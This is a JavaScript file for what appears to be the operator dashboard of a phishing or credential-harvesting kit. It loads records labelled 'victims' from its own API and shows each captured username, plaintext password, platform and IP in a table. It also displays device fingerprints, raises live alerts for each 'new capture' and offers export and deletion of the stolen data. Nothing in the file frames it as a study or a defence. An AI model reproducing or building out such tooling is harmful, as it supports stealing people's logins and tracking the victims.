const canvas = document.getElementById('bg-canvas');
const ctx = canvas.getContext('2d');
let particles = [];

function initParticles() {
  canvas.width = window.innerWidth; canvas.height = window.innerHeight;
  particles = [];
  for (let i = 0; i < 80; i++) {
    particles.push({
      x: Math.random() * canvas.width, y: Math.random() * canvas.height,
      vx: (Math.random() - 0.5) * 0.5, vy: (Math.random() - 0.5) * 0.5, size: Math.random() * 2
    });
  }
}

function drawParticles() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = 'rgba(0, 255, 255, 0.2)'; ctx.strokeStyle = 'rgba(0, 255, 255, 0.05)';
  particles.forEach((p, i) => {
    p.x += p.vx; p.y += p.vy;
    if (p.x < 0 || p.x > canvas.width) p.vx *= -1; if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
    ctx.beginPath(); ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2); ctx.fill();
    for (let j = i + 1; j < particles.length; j++) {
      let p2 = particles[j]; let dist = Math.hypot(p.x - p2.x, p.y - p2.y);
      if (dist < 150) { ctx.lineWidth = 1 - dist / 150; ctx.beginPath(); ctx.moveTo(p.x, p.y); ctx.lineTo(p2.x, p2.y); ctx.stroke(); }
    }
  });
  requestAnimationFrame(drawParticles);
}
initParticles(); drawParticles(); window.addEventListener('resize', initParticles);

function showSection(id, e) {
  document.getElementById('section-dashboard').style.display = id === 'dashboard' ? 'block' : 'none';
  document.getElementById('section-contact').style.display = id === 'contact' ? 'block' : 'none';
  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
  const currentEvent = e || window.event;
  if (currentEvent && currentEvent.currentTarget) {
    currentEvent.currentTarget.classList.add('active');
  }
}

const socket = io();
let platformChart = null;

function addLog(msg, type = '') {
  const feed = document.getElementById('log-feed');
  const item = document.createElement('div');
  item.className = `log-item ${type}`;
  item.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
  feed.prepend(item);
  if (feed.childNodes.length > 50) feed.lastChild.remove();
}

function loadData() {
  fetch('/api/victims').then(r => r.json()).then(data => {
    renderTable(data); updateStats(data); updateChart(data);
  });
  loadFingerprints();
}

function loadFingerprints() {
  fetch('/api/fingerprints').then(r => r.json()).then(data => {
    renderFingerprints(data);
  });
}

function updateStats(data) {
  const creds = data.filter(v => v.username !== 'IP_ONLY').length;
  const ips = data.filter(v => v.username === 'IP_ONLY').length;
  const platforms = new Set(data.map(v => v.platform)).size;
  document.getElementById('stat-total').innerText = data.length;
  document.getElementById('stat-creds').innerText = creds;
  document.getElementById('stat-ips').innerText = ips;
  document.getElementById('stat-platforms').innerText = platforms;
}

function updateChart(data) {
  const counts = {}; data.forEach(v => counts[v.platform] = (counts[v.platform] || 0) + 1);
  if (platformChart) platformChart.destroy();
  const ctxChart = document.getElementById('platformChart').getContext('2d');
  platformChart = new Chart(ctxChart, {
    type: 'doughnut',
    data: { labels: Object.keys(counts), datasets: [{ data: Object.values(counts), backgroundColor: ['#00ffff', '#9d00ff', '#ff2d86', '#10b981', '#f59e0b', '#ff3232'], borderWidth: 0 }] },
    options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { position: 'right', labels: { color: '#94a3b8' } } }, cutout: '70%' }
  });
}

function renderTable(data) {
  const tbody = document.getElementById('victims-body');
  if (!data.length) { tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; padding: 5rem; color: var(--dim)">AWAITING PAYLOADS...</td></tr>'; return; }
  tbody.innerHTML = data.map((v, i) => `
    <tr>
      <td style="color:var(--dim)">#${v.id}</td>
      <td><span class="badge badge-cyan">${v.platform}</span></td>
      <td style="font-weight:700">${v.username === 'IP_ONLY' ? '<span style="color:var(--dim)">DISCOVERY</span>' : v.username}</td>
      <td style="font-family:'JetBrains Mono'; color:var(--pink)">${v.password === 'N/A' ? '—' : v.password}</td>
      <td style="font-family:'JetBrains Mono'; font-size:0.85rem">${v.ip}</td>
      <td style="color:var(--dim); font-size:0.8rem">${v.timestamp}</td>
      <td>
        <button class="btn btn-danger" onclick="deleteVictim(${v.id})" style="padding: 0.3rem 0.6rem; font-size: 0.75rem;">DELETE</button>
      </td>
    </tr>
  `).join('');
}

function renderFingerprints(data) {
  const tbody = document.getElementById('fingerprints-body');
  if (!data.length) { tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding: 5rem; color: var(--dim)">AWAITING DEVICE DATA...</td></tr>'; return; }
  tbody.innerHTML = data.map((v, i) => `
    <tr>
      <td style="color:var(--dim)">#${v[0]}</td>
      <td style="font-weight:700">${v[1]}</td>
      <td style="font-size:0.85rem">${v[2]}</td>
      <td style="font-family:'JetBrains Mono'; font-size:0.85rem">${v[3]}x${v[4]}</td>
      <td style="color:var(--accent)">${v[5]}</td>
      <td style="color:var(--accent2)">${v[6]}</td>
      <td style="font-family:'JetBrains Mono'; font-size:0.85rem">${v[8]}</td>
      <td style="color:var(--dim); font-size:0.8rem">${v[7]}</td>
      <td>
        <button class="btn btn-danger" onclick="deleteFingerprint(${v[0]})" style="padding: 0.3rem 0.6rem; font-size: 0.75rem;">DELETE</button>
      </td>
    </tr>
  `).join('');
}

socket.on('new_victim', () => { addLog(`New capture detected!`, "success"); loadData(); });
socket.on('new_fingerprint', (data) => { 
  addLog(`New device fingerprint detected: ${data.os} - ${data.screen_width}x${data.screen_height}`, "success"); 
  loadFingerprints(); 
});
loadData(); setInterval(loadData, 5000);
setInterval(loadFingerprints, 5000);

function deleteVictim(id) {
  if (!confirm('Are you sure you want to delete this record?')) return;
  fetch(`/api/delete/${id}`, { method: 'POST' })
    .then(r => r.json())
    .then(data => {
      if (data.status === 'success') {
        addLog(`Record #${id} deleted successfully`, 'success');
        loadData();
      } else {
        addLog(`Failed to delete record: ${data.message}`, 'error');
      }
    })
    .catch(err => addLog(`Error deleting record: ${err}`, 'error'));
}

function deleteAllVictims() {
  if (!confirm('Are you sure you want to delete ALL records? This action cannot be undone!')) return;
  fetch('/api/delete_all', { method: 'POST' })
    .then(r => r.json())
    .then(data => {
      if (data.status === 'success') {
        addLog(`All records deleted successfully`, 'success');
        loadData();
      } else {
        addLog(`Failed to delete all records: ${data.message}`, 'error');
      }
    })
    .catch(err => addLog(`Error deleting all records: ${err}`, 'error'));
}

function resetIds() {
  if (!confirm('Are you sure you want to reset all IDs to start from 1?')) return;
  fetch('/api/reset_ids', { method: 'POST' })
    .then(r => r.json())
    .then(data => {
      if (data.status === 'success') {
        addLog(`All IDs reset successfully`, 'success');
        loadData();
      } else {
        addLog(`Failed to reset IDs: ${data.message}`, 'error');
      }
    })
    .catch(err => addLog(`Error resetting IDs: ${err}`, 'error'));
}

function deleteFingerprint(id) {
  if (!confirm('Are you sure you want to delete this fingerprint?')) return;
  fetch(`/api/delete_fingerprint/${id}`, { method: 'POST' })
    .then(r => r.json())
    .then(data => {
      if (data.status === 'success') {
        addLog(`Fingerprint #${id} deleted successfully`, 'success');
        loadFingerprints();
      } else {
        addLog(`Failed to delete fingerprint: ${data.message}`, 'error');
      }
    })
    .catch(err => addLog(`Error deleting fingerprint: ${err}`, 'error'));
}

function deleteAllFingerprints() {
  if (!confirm('Are you sure you want to delete ALL fingerprints? This action cannot be undone!')) return;
  fetch('/api/delete_all_fingerprints', { method: 'POST' })
    .then(r => r.json())
    .then(data => {
      if (data.status === 'success') {
        addLog(`All fingerprints deleted successfully`, 'success');
        loadFingerprints();
      } else {
        addLog(`Failed to delete all fingerprints: ${data.message}`, 'error');
      }
    })
    .catch(err => addLog(`Error deleting all fingerprints: ${err}`, 'error'));
}

function resetFingerprintIds() {
  if (!confirm('Are you sure you want to reset fingerprint IDs to start from 1?')) return;
  fetch('/api/reset_fingerprint_ids', { method: 'POST' })
    .then(r => r.json())
    .then(data => {
      if (data.status === 'success') {
        addLog(`Fingerprint IDs reset successfully`, 'success');
        loadFingerprints();
      } else {
        addLog(`Failed to reset fingerprint IDs: ${data.message}`, 'error');
      }
    })
    .catch(err => addLog(`Error resetting fingerprint IDs: ${err}`, 'error'));
}

// Sidebar export menu toggle and positioning
(function(){
  const exportNav = document.getElementById('nav-export');
  const exportMenu = document.getElementById('sidebarExportMenu');
  function positionExportMenu(){
    if(!exportNav || !exportMenu) return;
    const rect = exportNav.getBoundingClientRect();
    const top = rect.top + window.scrollY;
    const left = rect.right + 12; // place just outside sidebar
    exportMenu.style.top = `${top}px`;
    exportMenu.style.left = `${left}px`;
  }

  window.toggleExportMenu = function(e){
    if(e){ e.preventDefault(); e.stopPropagation(); }
    if(!exportMenu || !exportNav) return;
    const open = exportMenu.classList.toggle('open');
    exportMenu.setAttribute('aria-hidden', open ? 'false' : 'true');
    exportNav.classList.toggle('active', open);
    if(open) positionExportMenu();
  };

  document.addEventListener('click', (ev)=>{
    if(!exportMenu || !exportNav) return;
    if(!exportMenu.contains(ev.target) && !exportNav.contains(ev.target)){
      exportMenu.classList.remove('open');
      exportMenu.setAttribute('aria-hidden','true');
      exportNav.classList.remove('active');
    }
  });

  window.addEventListener('resize', ()=>{ if(exportMenu && exportMenu.classList.contains('open')) positionExportMenu(); });

  if(exportMenu){
    exportMenu.querySelectorAll('.sidebar-export-item').forEach(item=>{
      item.addEventListener('click', ()=>{
        const ep = item.dataset.endpoint;
        // navigate to the server endpoint to trigger download
        window.location.href = ep;
      });
    });
  }
})();
